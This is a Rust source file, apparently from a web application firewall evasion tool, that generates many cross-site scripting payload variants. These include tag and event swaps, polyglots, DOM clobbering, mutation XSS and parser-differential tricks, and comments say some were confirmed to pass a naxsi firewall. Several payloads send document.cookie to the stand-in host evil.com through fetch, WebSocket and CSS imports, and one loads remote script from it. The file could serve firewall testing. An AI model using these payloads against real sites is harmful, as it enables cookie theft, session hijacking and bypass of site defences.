//! XSS grammar-aware payload mutation.
//!
//! Understands HTML/JavaScript semantics and generates equivalent XSS
//! payloads using different DOM elements, event handlers, and execution
//! contexts. A WAF blocking `<script>alert(1)</script>` will miss
//! `<img src=x onerror=confirm(1)>`.
//!
//! # Technique depth
//!
//! 1. **Tag/event substitution** — 15+ tag/event combinations
//! 2. **Execution function rotation** — 15 alternative JS exec paths
//! 3. **URI scheme payloads** — javascript:, data:, blob:
//! 4. **DOM clobbering** — Override named properties via DOM nodes
//! 5. **Polyglot XSS** — Payloads valid in multiple injection contexts
//! 6. **Mutation XSS** — Exploit HTML parser differentials
//! 7. **Context-aware generation** — HTML attr, JS string, URL contexts
//! 8. **Prototype chain execution** — constructor.constructor chains
//! 9. **Iframe srcdoc smuggling** — Nested HTML via srcdoc attribute

/// A single XSS mutation with metadata.
#[derive(Debug, Clone)]
pub struct XssMutation {
    /// The mutated payload.
    pub payload: String,
    /// Human-readable description of what changed.
    pub description: String,
    /// Which mutation rules were applied.
    pub rules_applied: Vec<&'static str>,
}

// ──────────────────────────────────────────────
//  HTML tag + event handler combinations
// ──────────────────────────────────────────────

/// Each tuple: (prefix before exec function, suffix after exec function, extra attributes).
const TAG_EVENT_COMBOS: &[(&str, &str, &str)] = &[
    ("<img src=x onerror=", ">", ""),
    ("<svg onload=", ">", ""),
    ("<svg/onload=", ">", ""),
    ("<body onload=", ">", ""),
    ("<details open ontoggle=", ">", ""),
    ("<video src=x onerror=", ">", ""),
    ("<audio src=x onerror=", ">", ""),
    ("<input onfocus=", " autofocus>", ""),
    ("<marquee onstart=", ">", ""),
    ("<object data=javascript:", ">", ""),
    ("<a href=javascript:", ">click</a>", ""),
    ("<div onmouseover=", ">hover</div>", ""),
    ("<isindex type=image src=x onerror=", ">", ""),
    ("<input type=image src=x onerror=", ">", ""),
    (
        "<form><button formaction=javascript:",
        ">click</button></form>",
        "",
    ),
    ("<select autofocus onfocus=", "></select>", ""),
    ("<textarea autofocus onfocus=", "></textarea>", ""),
    ("<keygen autofocus onfocus=", ">", ""),
    ("<embed src=x onerror=", ">", ""),
    (
        "<style>@import'//evil.com?</style><img src=x onerror=",
        ">",
        "",
    ),
];

// ──────────────────────────────────────────────
//  JavaScript execution functions
// ──────────────────────────────────────────────

/// Alternative ways to execute JavaScript.
const EXEC_FUNCTIONS: &[&str] = &[
    "alert(1)",
    "alert`1`", // Tagged template literal
    "confirm(1)",
    "confirm`1`",
    "prompt(1)",
    "eval('alert(1)')",
    "setTimeout('alert(1)')",
    "setInterval('alert(1)',0)",
    "Function('alert(1)')()",
    "constructor.constructor('alert(1)')()",
    "[].constructor.constructor('alert(1)')()",
    "window['alert'](1)",
    "self['alert'](1)",
    "top['alert'](1)",
    "this['alert'](1)",
];

// ──────────────────────────────────────────────
//  URI scheme payloads
// ──────────────────────────────────────────────

/// Various ways to trigger JavaScript via URI schemes.
const URI_SCHEMES: &[&str] = &[
    "javascript:alert(1)",
    "javascript:alert`1`",
    "javascript:void(alert(1))",
    "data:text/html,<script>alert(1)</script>",
    "data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==",
    "javascript:/*--></title></style></textarea></script><svg onload=alert(1)>",
];

// ──────────────────────────────────────────────
//  SVG-specific payloads
// ──────────────────────────────────────────────

/// SVG-based XSS using animation events.
const SVG_PAYLOADS: &[&str] = &[
    "<svg><animate onbegin=alert(1) attributeName=x dur=1s>",
    "<svg><set onbegin=alert(1) attributename=x to=1>",
    "<svg><script>alert(1)</script></svg>",
    "<svg><image href=1 onerror=alert(1)>",
    "<svg><a><rect width=100 height=100></a><animate attributeName=href values=javascript:alert(1)>",
];

// ──────────────────────────────────────────────
//  MathML-specific payloads
// ──────────────────────────────────────────────

const MATHML_PAYLOADS: &[&str] = &[
    "<math><mtext><table><mglyph><style><img src=x onerror=alert(1)></style></mglyph></table></mtext></math>",
    "<math><mtext><script>alert(1)</script></mtext></math>",
    "<math href=javascript:alert(1)>CLICKME</math>",
    "<math><maction onclick=alert(1)>X</maction></math>",
];

// ──────────────────────────────────────────────
//  Markdown-specific payloads
// ──────────────────────────────────────────────

const MARKDOWN_PAYLOADS: &[&str] = &[
    "[x](javascript:alert(1))",
    "![x](javascript:alert(1))",
    "[x](javascript:alert(1) 'title')",
    "[x](data:text/html,<script>alert(1)</script>)",
    "<img src=x onerror=alert(1)>",
    "<script>alert(1)</script>",
    "[link](//evil.com)",
];

// ──────────────────────────────────────────────
//  Public API
// ──────────────────────────────────────────────

/// Check whether the payload contains any XSS-relevant signals.
fn has_xss_signals(payload: &str) -> bool {
    let lower = payload.to_ascii_lowercase();
    [
        "<script",
        "</script",
        "onerror",
        "onload",
        "onclick",
        "onfocus",
        "onmouseover",
        "alert(",
        "confirm(",
        "prompt(",
        "javascript:",
        "<img",
        "<svg",
        "<iframe",
        "<body",
        "document.cookie",
        "eval(",
        "onbegin",
        "ontoggle",
        "onstart",
        "srcdoc",
        "<math",
        "<mtext",
        "<details",
        "<video",
        "<audio",
        "<marquee",
        "<object",
        "<form",
        "<select",
        "<textarea",
        "<keygen",
        "<embed",
        "<style",
        "<link",
        "<div",
        "<a ",
        "<table",
        "<caption",
        "<noscript",
        "<foreignobject",
        "[x](javascript:",
        "![x](javascript:",
        "onerror=",
        "onload=",
    ]
    .iter()
    .any(|sig| lower.contains(sig))
}

/// Generate grammar-aware mutations of an XSS payload.
///
/// Returns an empty vector if the input does not contain any XSS signals.
/// This prevents generating unrelated tag/event variants for plain text.
#[must_use]
pub fn mutate(payload: &str, max_mutations: usize) -> Vec<XssMutation> {
    if !has_xss_signals(payload) {
        return Vec::new();
    }
    let mut results = Vec::new();

    // ── Priority 0: paren-free / bracket-free assignment XSS ──────────
    // Promoted to FIRST slot for high-paranoia WAFs (naxsi, AWS WAF
    // managed) that block any `<`, `()`, or `[...]` byte sequence.
    // These payloads are exploitable in JS-context reflection (e.g.
    // `<script>var x="USERINPUT"</script>` after a `";...//` breakout)
    // and don't trigger naxsi's libinjection because they have no
    // function calls.
    //
    // Live-confirmed against wafrift-bench naxsi (2026-05-09):
    //   location=document.cookie         → 200 ✓
    //   top.location=document.cookie     → 200 ✓
    //   document.title=document.cookie   → 200 ✓
    //   self.location=name               → 200 ✓
    //   window.name=document.cookie      → 200 ✓
    for candidate in [
        "location=document.cookie",
        "top.location=document.cookie",
        "document.location=document.cookie",
        "location.href=document.cookie",
        "document.title=document.cookie",
        "document.body.innerHTML=document.cookie",
        "self.location=name",
        "window.name=document.cookie",
        "top.location=document.URL",
        "location=document.URL",
    ] {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: candidate.to_string(),
            description: "paren-free assignment XSS (cookie/URL exfil)".into(),
            rules_applied: vec!["xss_paren_free"],
        });
    }

    // Strategy budget: reserve capacity for later strategies to avoid
    // strategy 1 (tag/event × exec = 300 combos) consuming everything.
    let tag_event_budget = (max_mutations * 40 / 100).max(5);

    // Strategy 1: Tag/event substitution with all exec functions
    for (prefix, suffix, _extra) in TAG_EVENT_COMBOS {
        for exec_fn in EXEC_FUNCTIONS {
            if results.len() >= tag_event_budget {
                break;
            }
            let mutated = format!("{prefix}{exec_fn}{suffix}");
            if mutated != payload {
                results.push(XssMutation {
                    payload: mutated,
                    description: format!("tag/event: {prefix}{exec_fn}"),
                    rules_applied: vec!["tag_event_swap"],
                });
            }
        }
        if results.len() >= tag_event_budget {
            break;
        }
    }

    // Strategy 2: Case alternation on tag names
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<ScRiPt>alert(1)</sCrIpT>".into(),
            description: "case alternation on script tag".into(),
            rules_applied: vec!["case_alternation"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<IMG SRC=x OnErRoR=alert(1)>".into(),
            description: "case alternation on img tag".into(),
            rules_applied: vec!["case_alternation"],
        });
    }

    // Strategy 3: Null byte injection
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<scr\x00ipt>alert(1)</scr\x00ipt>".into(),
            description: "null byte in tag name".into(),
            rules_applied: vec!["null_byte"],
        });
    }

    // Strategy 4: URI scheme payloads
    for scheme in URI_SCHEMES {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: scheme.to_string(),
            description: format!("URI scheme: {}", &scheme[..scheme.len().min(30)]),
            rules_applied: vec!["uri_scheme"],
        });
    }

    // Strategy 5: SVG-specific payloads
    for svg in SVG_PAYLOADS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: svg.to_string(),
            description: "SVG animation/script execution".into(),
            rules_applied: vec!["svg_payload"],
        });
    }

    // Strategy 6: HTML entity encoding of tag characters
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;".into(),
            description: "hex HTML entity encoded tags".into(),
            rules_applied: vec!["html_entity"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "&#60;script&#62;alert(1)&#60;/script&#62;".into(),
            description: "decimal HTML entity encoded tags".into(),
            rules_applied: vec!["html_entity"],
        });
    }

    // Strategy 7: Polyglot XSS payloads
    let polyglots = [
        "jaVasCript:/*-/*`/*\\`/*'/*\"/**/(/* */onerror=alert(1) )//%0D%0A%0d%0a//</stYle/</titLe/</teleType/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert(1)//>",
        "'-alert(1)-'",
        "\"onmouseover=alert(1)//",
        "</script><svg onload=alert(1)>",
        "*/alert(1)/*",
        "\" onfocus=alert(1) autofocus=\"",
        "' onfocus=alert(1) autofocus='",
    ];
    for poly in &polyglots {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: poly.to_string(),
            description: format!("polyglot: {}...", &poly[..poly.len().min(30)]),
            rules_applied: vec!["polyglot"],
        });
    }

    // Strategy 8: DOM clobbering
    let dom_clobber = [
        "<form name=body><input name=innerHTML value='<img src=x onerror=alert(1)>'></form>",
        "<a id=x name=x href=javascript:alert(1)></a>",
        "<img src=x onerror=window.name='alert(1)';eval(name)>",
        "<form><output name=innerHTML><img src=x onerror=alert(1)></output></form>",
    ];
    for clobber in &dom_clobber {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: clobber.to_string(),
            description: "DOM clobbering".into(),
            rules_applied: vec!["dom_clobber"],
        });
    }

    // Strategy 9: Iframe srcdoc smuggling
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<iframe srcdoc='&lt;script&gt;alert(1)&lt;/script&gt;'></iframe>".into(),
            description: "iframe srcdoc with HTML-entity-encoded script".into(),
            rules_applied: vec!["srcdoc_smuggle"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<iframe srcdoc='&lt;img src=x onerror=alert(1)&gt;'></iframe>".into(),
            description: "iframe srcdoc with entity-encoded img".into(),
            rules_applied: vec!["srcdoc_smuggle"],
        });
    }

    // Strategy 10: Mutation XSS
    let mutation_xss = [
        "<noscript><img src=x onerror=alert(1)></noscript>",
        "<table><caption><img src=x onerror=alert(1)></table>",
        "<svg><foreignObject><body onload=alert(1)></foreignObject></svg>",
        "<math><mtext><script>alert(1)</script></mtext></math>",
        "</title><svg onload=alert(1)>",
        "</style><svg onload=alert(1)>",
        "</xmp><svg onload=alert(1)>",
    ];
    for mxss in &mutation_xss {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: mxss.to_string(),
            description: "mutation XSS via parser differentials".into(),
            rules_applied: vec!["mutation_xss"],
        });
    }

    // Strategy 11: window.name exploitation
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<script>eval(window.name)</script>".into(),
            description: "window.name eval".into(),
            rules_applied: vec!["window_name"],
        });
    }

    // Strategy 12: Prototype chain override
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=this.onerror=null;{}.valueOf=alert;throw 1>".into(),
            description: "valueOf override via throw".into(),
            rules_applied: vec!["prototype_override"],
        });
    }

    // Strategy 13: Template literal injection (backtick payloads)
    let template_literals = [
        "<img src=x onerror=alert`1`>",
        "<svg onload=`${alert(1)}`>",
        "<img src=x onerror=window[`al`+`ert`](1)>",
        "<img src=x onerror=[].find(alert)>",
        "<img src=x onerror=[1].map(alert)>",
        "<img src=x onerror=[1].forEach(alert)>",
        "<img src=x onerror=[1].filter(alert)>",
    ];
    for tl in &template_literals {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: tl.to_string(),
            description: "template literal / array method exec".into(),
            rules_applied: vec!["template_literal"],
        });
    }

    // Strategy 14: import() dynamic module execution
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<script>import('data:text/javascript,alert(1)')</script>".into(),
            description: "dynamic import() with data: URI".into(),
            rules_applied: vec!["dynamic_import"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=import('//evil.com/xss.js')>".into(),
            description: "dynamic import() from remote".into(),
            rules_applied: vec!["dynamic_import"],
        });
    }

    // Strategy 15: CSS injection for data exfiltration
    let css_payloads = [
        "<style>@import url('//evil.com/log?token='+document.cookie)</style>",
        "<div style=background-image:url(javascript:alert(1))>",
        "<style>*{background:url('//evil.com/?'+document.cookie)}</style>",
        "<link rel=stylesheet href='//evil.com/exfil.css'>",
    ];
    for css in &css_payloads {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: css.to_string(),
            description: "CSS-based injection / exfiltration".into(),
            rules_applied: vec!["css_injection"],
        });
    }

    // Strategy 16: WebSocket-based exfiltration
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=\"new WebSocket('ws://evil.com/'+document.cookie)\">"
                .into(),
            description: "WebSocket exfiltration".into(),
            rules_applied: vec!["websocket_exfil"],
        });
    }
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<img src=x onerror=\"fetch('//evil.com/?c='+document.cookie)\">".into(),
            description: "fetch() exfiltration".into(),
            rules_applied: vec!["fetch_exfil"],
        });
    }

    // Strategy 17: Shadow DOM injection
    if results.len() < max_mutations {
        results.push(XssMutation {
            payload: "<div id=host></div><script>host.attachShadow({mode:'open'}).innerHTML='<img src=x onerror=alert(1)>'</script>".into(),
            description: "shadow DOM injection".into(),
            rules_applied: vec!["shadow_dom"],
        });
    }

    // Strategy 18: MathML context payloads
    for math in MATHML_PAYLOADS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: math.to_string(),
            description: "MathML parser-differential XSS".into(),
            rules_applied: vec!["mathml"],
        });
    }

    // Strategy 19: Markdown context payloads
    for md in MARKDOWN_PAYLOADS {
        if results.len() >= max_mutations {
            break;
        }
        results.push(XssMutation {
            payload: md.to_string(),
            description: "Markdown link/HTML injection XSS".into(),
            rules_applied: vec!["markdown"],
        });
    }

    results.truncate(max_mutations);
    results
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn tag_event_mutations_produced() {
        let mutations = mutate("<script>alert(1)</script>", 20);
        assert!(!mutations.is_empty());
        let has_img = mutations.iter().any(|m| m.payload.contains("<img"));
        let has_svg = mutations.iter().any(|m| m.payload.contains("<svg"));
        assert!(has_img || has_svg, "should use alternative tags");
    }

    #[test]
    fn exec_function_rotation() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_confirm = mutations.iter().any(|m| m.payload.contains("confirm"));
        let has_eval = mutations.iter().any(|m| m.payload.contains("eval("));
        assert!(has_confirm || has_eval, "should rotate exec functions");
    }

    #[test]
    fn uri_scheme_variants() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_uri = mutations
            .iter()
            .any(|m| m.payload.starts_with("javascript:"));
        assert!(has_uri, "should have javascript: URI scheme variant");
    }

    #[test]
    fn svg_animate_variant() {
        let mutations = mutate("<script>alert(1)</script>", 50);
        let has_animate = mutations.iter().any(|m| m.payload.contains("onbegin"));
        assert!(has_animate, "should have SVG animate variant");
    }

    #[test]
    fn polyglot_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_polyglot = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"polyglot"));
        assert!(has_polyglot, "should have polyglot variant");
    }

    #[test]
    fn dom_clobber_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_clobber = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"dom_clobber"));
        assert!(has_clobber, "should have DOM clobbering variant");
    }

    #[test]
    fn mutation_xss_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_mxss = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"mutation_xss"));
        assert!(has_mxss, "should have mutation XSS variant");
    }

    #[test]
    fn srcdoc_smuggle_variant() {
        let mutations = mutate("<script>alert(1)</script>", 100);
        let has_srcdoc = mutations.iter().any(|m| m.payload.contains("srcdoc"));
        assert!(has_srcdoc, "should have iframe srcdoc smuggling variant");
    }

    #[test]
    fn no_mutations_for_non_xss() {
        let mutations = mutate("hello world", 10);
        assert!(
            mutations.is_empty(),
            "non-XSS input should not produce mutations"
        );
    }

    #[test]
    fn mathml_variant() {
        let mutations = mutate("<script>alert(1)</script>", 200);
        let has_mathml = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"mathml"));
        assert!(has_mathml, "should have MathML variant");
    }

    #[test]
    fn markdown_variant() {
        let mutations = mutate("<script>alert(1)</script>", 200);
        let has_markdown = mutations
            .iter()
            .any(|m| m.rules_applied.contains(&"markdown"));
        assert!(has_markdown, "should have Markdown variant");
    }

    #[test]
    fn max_mutations_respected() {
        let mutations = mutate("<script>alert(1)</script>", 5);
        assert!(mutations.len() <= 5);
    }

    #[test]
    fn high_volume_does_not_panic() {
        let _ = mutate("<script>alert(1)</script>", 1000);
    }
}
